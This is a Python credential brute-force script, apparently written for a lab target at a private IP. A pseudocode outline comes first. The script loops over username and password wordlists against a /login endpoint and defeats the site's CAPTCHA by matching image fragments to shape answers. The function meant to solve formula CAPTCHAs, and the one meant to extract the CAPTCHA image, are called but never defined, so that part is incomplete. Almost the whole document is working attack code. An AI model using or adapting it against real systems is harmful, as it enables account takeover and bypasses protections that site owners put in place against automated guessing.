"""
EXPLOIT LOGIN 
-------------



- load usernames
- load passwords

- for each username:
	for each password:
		- make a GET request to `/login`
		while {true}
			check if `Detected 3 incorrect login attempts!` in response
				- fetch <img src="data:image/png;base64,__IMG_BASE64__">
				- if Dh4eHvKNzWywWf8f0eDzOu4f5LxrOwHAGhjMwnIHhDAxnYDgDwxkYzsBwBoYzMJyB4QwMZ2A4A8MZGM7AcAa in image
					- make a POST request to `/login` captcha=square
				- else if ksIZpR4atmypa6PoeoGGCBfvXpFKzxwQChwnQUwzjMqKspevSckRLfz1g0wgE6bNo1sOHBAOKPQBqjeU6lSJ in image
					- make a POST request to `/login` captcha=triangle
				- else if uabb7y15AEDBkjbkIjUV4GNNa9bt063atVKMv2tt94q6RJrVx01gRGWSKxevVrKG9zymDFj9IULFzyfsAAti in image
					- make a POST request to `/login` captcha=circle
				else
					- convert the base64 image to text
					- calculate the formula
					- make a POST request to `/login` captcha=result
			else
				- break the loop

		- make a POST request to `/login` username=user&password=pass
		- check if response does not contain: `Invalid username or password`
			- print username:password combination
			- exit


"""


import requests

def get_userpass(userlist, passlist):
    with open(userlist, 'rt') as file1, open(passlist, 'rt') as file2:
        return file1.read().splitlines(), file2.read().splitlines()

def http_req(method, end_point, data=None):
    return requests.request(method=method, url=end_point, data=data)

def main():
    TARGET = '10.10.41.6'
    LOGIN_END_POINT = f'http://{TARGET}/login'

    USER_LIST = 'list.txt'
    PASS_LIST = 'pass.txt'
    
    usernames, passwords = get_userpass(USER_LIST, PASS_LIST)

    for u in usernames:
        for p in passwords:
            u = u.strip()
            p = p.strip()

            while True:
                r = http_req('GET', LOGIN_END_POINT)
                if 'Detected 3 incorrect login attempts!' in r.text:
                    data = {"captcha": ""}
                    if 'Dh4eHvKNzWywWf8f0eDzOu4f5LxrOwHAGhjMwnIHhDAxnYDgDwxkYzsBwBoYzMJyB4QwMZ2A4A8MZGM7AcAa' in r.text:
                        data['captcha'] = "square"
                    elif 'ksIZpR4atmypa6PoeoGGCBfvXpFKzxwQChwnQUwzjMqKspevSckRLfz1g0wgE6bNo1sOHBAOKPQBqjeU6lSJ' in r.text:
                        data['captcha'] = 'triangle'
                    elif 'uabb7y15AEDBkjbkIjUV4GNNa9bt063atVKMv2tt94q6RJrVx01gRGWSKxevVrKG9zymDFj9IULFzyfsAAti' in r.text:
                        data['captcha'] = 'circle'
                    else:
                        image = extract_captcha_image(r.text)
                        result = solve_captcha(image)
                        data['captcha'] = result

                    http_req('POST', LOGIN_END_POINT, data=data)
                else:
                    break

            data = {"username": u, "password": p}
            r = http_req('POST', LOGIN_END_POINT, data=data)
            if 'Invalid username or password' in r.text:
                continue
            print(f"\n[*] Valid creds found: {u}:{p}")
            if input('[E]xit | [C]ontinue\n> ').strip().lower() in ['e', 'exit']:
                exit(0)

if __name__ == '__main__':
    main()
